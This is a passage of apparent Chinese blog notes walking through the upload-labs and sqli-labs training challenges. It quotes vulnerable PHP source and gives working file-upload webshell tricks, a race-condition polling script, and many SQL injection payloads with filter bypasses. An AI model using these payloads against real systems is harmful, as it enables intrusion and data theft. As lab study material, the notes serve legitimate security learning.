&#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename);// 获取图片文件大小 $ext = image_type_to_extension($info[2]); // 根据常量大小返回图片后缀名 if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; getimagesize函数的返回值，随便测试了下，使用的是png格式图片，返回了六个值，使用的数组中的第二个值，代表图片的类型 PHP开发手册所有的图片格式代表的数字 我使用上一关制作的图片马不行，就直接echo命令将php代码写在一张图片的末尾，在上传发现可以，也能正常解析（这应该是最简单的方法） echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt;&gt; 2.png 在使用有文件包含漏洞的页面发现可以正常解析图片，这一关感觉才是正宗的图片马，之前检测文件头的并不是很有感觉，虽然也比较简单。 然后在做的时候审源码还是要一边审一边自己去尝试才是学得最快的，还有查php Manual。 Less-15(PHP内置函数绕过&lt;exif_imagetype&gt;)这关的检测图片函数名也叫isImage，但是写法和上一关的不一样了，用到了一个叫做exif_imagetype的函数，在php手册中是这样介绍的 123456789101112131415161718function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125; 读取图片的地一个字节然后检测标志，自己去测试下这个函数，其实就和上一关的getimagesize函数的作用差不多，都是返回代表图片后缀的后缀编号，下面贴php Manual的介绍。 使用14关制作的图片马就可以成功上传，然后使用文件包含漏洞去解析，emmmmm，感觉学到的东西很少唉。就感觉如果要过系统函数的检测那就直接在别的图片后面追加php代码然后使用文件上传漏洞去解析后面几关不知道是不是都能这样过。 Less-16(图片二次渲染绕过)这次直接尝试使用之前的图片马，发现失效了，看看源码这关对图片做了什么骚操作。源码是相当长啊。里面不认识的函数写在下面 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagejpeg($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagepng($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagegif($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125;&#125; basename：获取最路径字符串的基本路径（也就是文件名） unlink：上传文件，用于修复靶场之前的漏洞 imagecreatefromxxx：通过文件路径或者url生成新图像 imagexxx：从路径或者url生成一个新图像 总体逻辑就是只能上传三种格式的图片，经过php内置函数的二次渲染，如果原本的图片内部存在php后门代码那么经过二次渲染之后的图片就没有后门代码了。关于二次渲染的原理不是很懂，网上也说得不是很清楚，但是可以通过原图和经过二次渲染的图片进行比较来修改图片，需要知道一点基本的图片二进制格式，在修改时知道哪里需要修改。这里参考网上一些师傅的做法。 GIF将经过二次渲染的图片和原图进行比较，看看那些地方没有修改，然后在没有修改的地方进行添加，每一张gif图片相同处不会一样。 PNG需要了解PNG图片的格式，才知道如何修改才能让函数检测不出来，需要计算png图片的crc值，当payload写入图片时，crc值会随着payload的长度改变。 JPG这个需要使用一个国外大神的脚本，将payload写入.jpg格式的图片中，重新渲染的图片就会存在payload，且经过后端的代码再次二次渲染之后payload也不会消失。 Less-17(代码逻辑漏洞，条件竞争)代码审计，看源码，第一次审计代码，然后看到了一个新名词（条件竞争），也是第一次接触条件竞争。看了网上的简单讲解好像有些明白了。 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];//获取文件名 $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];//获取上传备份文件 $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);//获取文件后缀名 $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name;//得到上传路径 if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125;&#125; 源码逻辑如下：首先上传文件，在判断文件后缀名是否合法，这个操作比较关键（用网上的话说就是引狼入室），如果文件后缀名合法则修改文件名称，如果不合法则使用unlink函数删除文件。 在看网上的文章将条件竞争时总感觉少了点什么：php脚本本身是单线程，实现高并发的是服务器，这样的话应该每进行一次上传操作服务器会启用一个单独的线程来进行管理，为什么会造成条件竞争呢？ 在仔细看了看网上的文章，主要过程如下：不断向服务器发送恶意数据包，代码先将文件临时存储在服务器，然后再由后端代码判断。后端判断文件是否正常需要时间，然后在后端判断操作执行之前不断的访问那个恶意文件，如果访问成功，那么恶意文件就暂时不会被删除。 简单来说原理就是：在我们进行文件读写操作时，是不能删除该文件的。 首先需要使用bp来进行多线程发包，然后在使用Python来进行监控。这里还学到一个东西，关于docker的。 1234567891011# python监控代码import requestsurl = &quot;http://172.17.0.2:80/upload/shell.php&quot;while True: html = requests.get(url) if html.status_code == 200: print(&quot;YES,you upload it!&quot;) else: print(&quot;NO&quot;) 刚开始使用的ip地址和端口是0.0.0.0:88，当时没有想那么多，但是后面发现Python的requests一直报502错误，找了很久没找到原因，突然想到0.0.0.0:88是docker从容器中映射到本地的ip地址，如果需要请求那么ip地址应该是容器内的真实ip地址，这个地方卡了很久。 使用命令docker inspect upload-labs查看容器详细内容，里面说明了容器的网关地址和现在的使用的IPAddress，然后在去请求，秒通。 用脚本跑起来后就是一考验手速的问题了，一直F5刷新页面，可以看待偶尔会出现phpinfo()页面，蚁剑连上去也是断断续续的。 Less-18(条件竞争，图片马)也是代码审计题目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;?php//index.php$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; require_once(&quot;./myupload.php&quot;); $imgFileName =time();//利用时间戳进行文件命名 $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &#x27;文件已经被上传，但没有重命名。&#x27;; break; case -1: $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;; break; case -2: $msg = &#x27;上传失败，上传目录不可写。&#x27;; break; case -3: $msg = &#x27;上传失败，无法上传该类型文件。&#x27;; break; case -4: $msg = &#x27;上传失败，上传的文件过大。&#x27;; break; case -5: $msg = &#x27;上传失败，服务器已经存在相同名称文件。&#x27;; break; case -6: $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;; break; default: $msg = &#x27;未知错误！&#x27;; break; &#125;&#125;//myupload.phpclass MyUpload&#123; var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; ); /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); //check file upload path if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension();//check upload file extension if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize();//check upload file size if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); &#125;&#125;;?&gt; 源码定义了upload类，依次调用其中的方法，检测文件的顺序为： 检测目录 -&gt; 检测文件后缀名 -&gt; 检测文件大小 -&gt; 检测文件是否存在 -&gt; 将文件上传到服务器 -&gt; 重命名文件 所以这关可以使用图片马加条件竞争的方式去Pass，首先文件后缀名需要符合要求，才能上传到服务器，这个过程利用条件竞争来拿到网站shell(手速一定要快) 使用场景与触发条件： 服务器能多后缀名解析（或者其他解析漏洞），这个实在服务器层面 如果服务器层面上没有解析漏洞，那么就需要代码层面有文件包含漏洞（但是如果有文件包含漏洞就不需要条件竞争了） 代码逻辑为先上传，在重命名 总结：Pass-17与Pass-18都是使用条件竞争，其实条件竞争本身不是漏洞，只是在后端代码层面上出现了逻辑漏洞（先上传后判断在改名，所谓的引狼入室），在发现存在先上传后判断的代码都可测试使用条件竞争来get webshell Less-19(上传文件名可控，多方法绕过)这一关上传文件需要自定义文件名，文件名参数可控，那么方式就很多了。在windows和Linux上有不同的文件名称管理机制 后缀，空格，多点空格，%00截断绕过都可以，只需要在抓包的时候修改就OK。 Less-20(CTF)123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //检查MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名 $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; //如果$file不是数组就进行分割 $file = explode(&#x27;.&#x27;, strtolower($file));//将文件名全小写并且使用.分割 &#125; $ext = end($file);//得到文件后缀名 $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];//过滤掉多余的.号，防止服务器多重解析 $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;;&#125; 参数$file可控，看下来经过一系列过滤后就是$img_path = UPLOAD_PATH . &#39;/&#39; . $file_name，$file_name就是参数$file过滤后的形式。 从后往前看发现问题不大，审代码发现这样一句 if (!is_array($file))，这句话问题较大，如果$file是数组就不会进行分割","categories":[],"tags":[]},{"title":"","slug":"sqli-lab_adv","date":"2021-09-27T10:45:09.582Z","updated":"2021-12-31T16:20:01.051Z","comments":true,"path":"3/","link":"","permalink":"http://example.com/3/","excerpt":"","text":"Less-21/22Less-21: Cookie注入，使用的是base64编码进行注入，这里有两种方法：报错注入和普通的联合注入 1报错注入payload: YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IHZlcnNpb24oKSksIDB4N2UpLCAxKSAj 1联合注入payload: YWRtaW4nKSBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLDIsMyAj 两种方法都是先将注入语句进行base64编码之后在抓包修改Cookie头部信息 Less-22: 双引号Cookie头部注入，应该也是两种方式，报错和联合，尝试一下。 果然 12联合payload：admin&quot; and 1=2 union select 1,2,3 base64编码：YWRtaW4iIGFuZCAxPTIgdW5pb24gc2VsZWN0IDEsMiwzICM= 12报错注入payload：admin&quot; and updatexml(1, concat(0x7e, (select version()), 0x7e), 1) #base64编码：YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSwgY29uY2F0KDB4N2UsIChzZWxlY3QgdmVyc2lvbigpKSwgMHg3ZSksIDEpICM= Less-23/24Less-23： 报错注入，基于strip comments(看不懂是啥意思)，看了源码后推断应该绕过简单的过滤。 1234567891011// 过滤特殊字符部分源码&lt;?$id=$_GET[&#x27;id&#x27;];//filter the comments out so as to comments should not work$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);?&gt; 这里过滤了--和#符号，尝试了双写绕过和url编码绕过，都不行，学习了网上其他师傅的绕过方法，之前都没有用过，下面放payload 1payload：?id=-1&#x27; union select 1,2,3 and &#x27;1&#x27;=&#x27;1 最后追加and ‘1’=’1恒等式来闭合最后的引号，这个方法感觉有点巧妙唉，可以看到已经可以控制回显 Less-24: 第一次学二次注入，说一下二次注入的原理吧，如果存在insert语句，那么就可以吧payload写入数据库，当使用select语句或者其他语句查询到payload时，就会触发payload从而进行利用。下面附带一张讲解图 这个关卡需要的前提，需要知道一个用户名，需要能够自己注册帐号，且修改密码 12//造成二次注入的语句$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 首先注册一个名叫admin&#39; #的用户，假设有一个叫admin的用户我们已经知道，在注册之后选择修改admin&#39; #用户的密码，那么更新语句就会变成下面这样。 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27; #&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 相当与我们修改了admin用户的密码而原来的用户密码没有改变。这样在知道很多用户名的情况下就可以随意修改所知道的用户的密码。 Less-25/25aLess-25: 看名字应该是过滤了and和or关键字，报错注入，之前遇到过，看看可不可以使用双写绕过。 12345payload测试：首先测试单引号，发现可以引发报错：id=1&#x27; 在尝试闭合，发现可以截断，存在sql注入：id=1&#x27; --+在尝试使用and关键字，发现又报错，应该是and被正则匹配过滤：id=1&#x27; and 1=2--+双写and尝试绕过，成功，猜测正确：id=1&#x27; anandd 1=2--+ 1控制回显payload：id=1&#x27; anandd 1=2 union select 1,2,3--+ 但是作者让我们使用报错注入那就用报错注入搞下 1payload：id=1&#x27; anandd updatexml(1, concat(0x7e, (select version()), 0x7e), 1)--+ 其实这关用联合注入就用不到and或者or等关键字，所以作者才提示使用报错注入。 Less-25a: 12345678//过滤符号function blacklist($id)&#123; $id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#x27;/AND/i&#x27;,&quot;&quot;, $id); //Strip out AND (non case sensitive) return $id;&#125; 1控制回显payload: id=1 anandd 1=2 union select 1,2,3 但是作者希望我们使用盲注脚本，额，之前的好像也还没有写，下次一定。 Less-26/26aLess-26: 报错注入，过滤了空格和注释。报错注入，且过滤了空格和注释符号，想想要怎么绕过，注入方法前面学了一点后面的关卡应该就是注入加过waf 1过滤了注释符，那么就使用横等式来绕过：id=1&#x27; and &#x27;1&#x27;=&#x27;1，发现没有报错，不是说过滤了空格吗？。。看源码 1234567891011121314// 源码过滤的符号&lt;?phpfunction blacklist($id)&#123; $id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#x27;/and/i&#x27;,&quot;&quot;, $id); //Strip out AND (non case sensitive) $id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id); //Strip out -- $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out # $id= preg_replace(&#x27;/[\\s]/&#x27;,&quot;&quot;, $id); //Strip out spaces $id= preg_replace(&#x27;/[\\/\\\\\\\\]/&#x27;,&quot;&quot;, $id); //Strip out slashes return $id;&#125; ?&gt; 原来过滤了空格。。。还过滤了and，or等常见的关键字都可以用双写绕过，但是空格要怎么绕过呢？ 尝试：url编码（失败），在解析时就已经转换成了ascii码，这个问题还要好好想想，数据传输时编码转换问题。 ​ 使用回车url编码，mysql支持回车（失败，暂时不知道为什么） ​ 使用注释绕过，这个关卡不行，应为本身就过滤了注释符号 网上找的测试能够替代空格键测试的脚本 123456789101112131415import requestsdef changeToHex(num): tmp = hex(i).replace(&quot;0x&quot;, &quot;&quot;) if len(tmp)&lt;2: tmp = &#x27;0&#x27; + tmp return &quot;%&quot; + tmpreq = requests.session()for i in xrange(0,256): i = changeToHex(i) url = &quot;0.0.0.0/Less-26/?id=1&#x27;&quot; + i + &quot;%26%26&quot; + i + &quot;&#x27;1&#x27;=&#x27;1&quot; ret = req.get(url) if &#x27;Dumb&#x27; in ret.content: print &quot;good,this can use:&quot; + i 在经过一番折腾之后确定了可以使用%a0来代替空格 12payload: id=1&#x27;%a0aandnd%a0&#x27;1&#x27;=&#x27;2这个payload可以让后台查找错误没有回显 由于是基于错误的，现在绕过了waf就很好使用报错注入了。 1id=1&#x27;%a0oorr%a0updatexml(1, concat(0x7e, (select%a0version()), 0x7e), 1)%a0oorr%a0&#x27;1&#x27;=&#x27;1 Less-26a: 盲注，且过滤了空格和注释符号，想想要怎么绕过，注入方法前面学了一点后面的关卡应该就是注入加过waf 试了试和26关差不多，应该是作者想让我们使用盲注的手法来做，要写脚本 1测试payload: id=1&#x27;)%a0aandnd%a0(&#x27;1&#x27;=&#x27;1 再中间添加一条and if语句，就可以实现盲注入 1盲注payload: id=1&#x27;)%a0aandnd%a0sleep(5)%a0aandnd%a0(&#x27;1&#x27;=&#x27;1 判断注入类型的方法:1和1”正常回显，1’报错，判断为字符型，但是还要判断是否有小括号。 判断小括号有几种方法： 2’&amp;&amp;’1’=’1若查询语句为where id=’$id’，查询时是where id=’2’&amp;&amp;’1’=’1’，结果是where id=’2’，回显会是id=2。若查询语句为where id=(‘$id’)，查询时是where id=(‘2’&amp;&amp;’1’=’1’)，MySQL 将’2’作为了 Bool 值，结果是where id=(‘1’)，回显会是id=1。1’)||’1’=(‘1若查询语句有小括号正确回显，若无小括号错误回显（无回显）。 Less-27/27aLess-27: 基于错误，过滤了更多的东西，最主要的是union和select关键字，这里涉及到了PHP正则匹配的知识。 123456789101112i如果设定了此修正符，模式中的字符将同时匹配大小写字母。m如果设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。s如果设定了此修正符，模式中的圆点元字符.匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。x如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的#以及下一个换行符之间的所有字符，包括两头，也都被忽略。e如果设定了此修正符，preg_replace()在替换字符串中对逆向引用作正常的替换。?在./+/*之后表示非贪婪匹配，./+/*限定符都是贪婪的，它们会尽可能多的匹配文字，在它们的后面加上一个?就可以实现非贪婪或最小匹配。 123456789101112131415161718&lt;?phpfunction blacklist($id)&#123; $id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;, $id); //Strip out union $id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;, $id); //Strip out select $id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;, $id); //Strip out UNION $id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;, $id); //Strip out SELECT $id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;, $id); //Strip out Union $id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;, $id); //Strip out select return $id;&#125;?&gt; 测试id=1和id=1”发现回显正常，单引号报错，存在注入点，但是过滤了很多东西，绕过思路： 没有过滤and和or关键字，但是我这次想用||和&amp;&amp;两个符号来代替and,or select，union可以用大小写混写的方式去绕过，也可以使用双写的方式 空格，之前提到过，可以用%a0等url编码的方式绕过 注释符号过滤，后面的单引号无法注释就使用横等式来闭合后面的单引号 开始测试: 1首先使用联合注入控制回显：id=1&#x27;%a0and%a0&#x27;1&#x27;=&#x27;2&#x27;%a0UnIon%a0SeLeCT%a01,2,3%a0and&#x27;1&#x27;=&#x27;1 1尝试使用报错注入：","categories":[],"tags":[]},{"title":"","slug":"sqli-lab_base","date":"2021-09-27T10:45:09.365Z","updated":"2021-12-31T16:18:03.175Z","comments":true,"path":"2/","link":"","permalink":"http://example.com/2/","excerpt":"","text":"需要掌握的MySQL基本知识imformation_schema数据库中有很多张表，其中有用的信息如下： tables_schema：存放每个数据库中的所有表名，常用查询语句 select table_name from imformation_schema.tables where table_schema = &#39;xxxx&#39; columns：存放表名，以及每张表的列名，常用查询语句select column_name from imformation_schema.columns where table_name = &#39;xxxx&#39; 常用函数： version()，查询系统版本 database()，查询当前数据库名 concat()，使用符号连接字符串 group_concat()，将多个返回信息变成一列 Less-1/2Less-1: 字符形注入，需要加单引号。 Less-2: 数字型注入，不需要加单引号就可以注入。 Less-3/4Less-3: 从源代码看出查询语句加入了括号，目标就是绕过括号 1$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;; 原理和单引号差不多，但是多了括号就需要有括号的闭合 1payload: http://0.0.0.0:8080/Less-3/?id=-1&#x27;) union select 1,2,3--+ Less-4: 和第三关一样，区别就是从单引号变成了双引号 1payload: http://0.0.0.0:8080/Less-4/?id=-1&quot;) union select 1,2,3--+ Less-5/6Less-5: 报错注入，这里使用updatexml函数，常用的两个函数如下 1payload: http://0.0.0.0:8080/Less-5/?id=-1&#x27; and updatexml(1, concat(0x7e, (select database())), 1)--+ Less-6: 单引号变双引号，那就闭合双引号，作者源代码如下 12$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 1payload: http://0.0.0.0:8080/Less-6/?id=1&quot; and updatexml(1, concat(0x7e, (select database())), 1)--+ Less-7/8使用into_outfile函数写一句话木马，拿到网站webshell，buu上目前无法获取网站路径，先跳过，后面搭建本地环境搞。 Less-9/10sql盲注，没有了所有报错回显，脚本在写了在写了。 123456789101112131415161718192021222324&lt;?$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125;?&gt; Less-11/12Less-11：使用登录框登录，不同与之前，这次的提交方式是Post，但是注入方式和之前一样 源码如下 1234567891011121314151617181920&lt;?if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Name:&#x27;.$uname); fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; echo $sql.&quot;&lt;/br&gt;&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result);&#125;?&gt; 1payload: uname=admin&amp;passwd=admin&#x27; and 1=2 union select database(),version()# Less-12：同样是使用post提交方式，但是在提交之前对两个变量添加了双引号，并且在查询的时候使用的括号，源码如下 1234567&lt;?php$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);?&gt; 所以在注入的时候需要添加双引号和括号进行闭合 1payload: uname=admin&amp;passwd=admin&quot;) and 1=2 union select 1,2# Less-13/14Less-13：双注入，没有任何回显，使用报错注入，源码如下 12345&lt;? @$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result);?&gt; 1uname=1&amp;passwd=1&#x27;) and extractvalue(1,concat(0x7e,version(),0x7e))# Less-14：查询参数两边添加了双引号，所以添加双引号进行闭合，但还是使用报错注入，源码如下 12345678&lt;? // connectivity $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;; $passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result);?&gt; 1uname=1&amp;passwd=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e))# Less-15/16Less-15：post提交方式的sql盲注，没有任何回显，报错注入也不行，可以试一试布尔时间盲注 下面两种写法都不是很通用，他需要存在uname的前提下才可以注入，所以写一个通用的（在没有waf的前提下） 12错误的payload: uname=admin&amp;passwd=1&#x27; and if(length(database())=8, sleep(5), 1) #错误的payload: uname=admin&#x27; and if(length(database())=8, sleep(5), 1) #&amp;passwd=1 12正确的payload: uname=1&#x27; and 1=2 union select 1,sleep(5) #&amp;passwd=1 : uname=Dhakkan and if(length(database())=8, sleep(5), 1) 